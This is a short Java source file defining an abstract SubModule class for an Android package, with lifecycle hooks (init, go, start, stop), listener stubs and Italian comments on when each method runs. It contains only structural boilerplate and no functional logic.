package com.android.deviceinfo.module;

import com.android.deviceinfo.ProcessInfo;
import com.android.deviceinfo.evidence.Markup;

public abstract class SubModule {
	
	protected Markup markup;
	protected BaseModule module;
	
	protected boolean enabled = true;
	
	public final void init(BaseModule module, Markup markup){
		this.markup = markup;
		this.module = module;
		enabled = true;
		init();
	}
	
	protected void init() {
	}

	/**
	 * Go. Viene lanciato dopo il delay, ogni period.
	 */
	protected abstract void go();

	/**
	 * Begin. Viene lanciato quando il servizio viene creato. Se vuole puo'
	 * definire il delay e il period.
	 */
	protected abstract void start();

	/**
	 * End. Viene invocato quando il servizio viene chiuso.
	 */
	protected abstract void stop();

	public int notification(ProcessInfo process) {
		return 0;
	}
	
	protected void startListen() {
	}

	protected void stopListen() {
	}
}
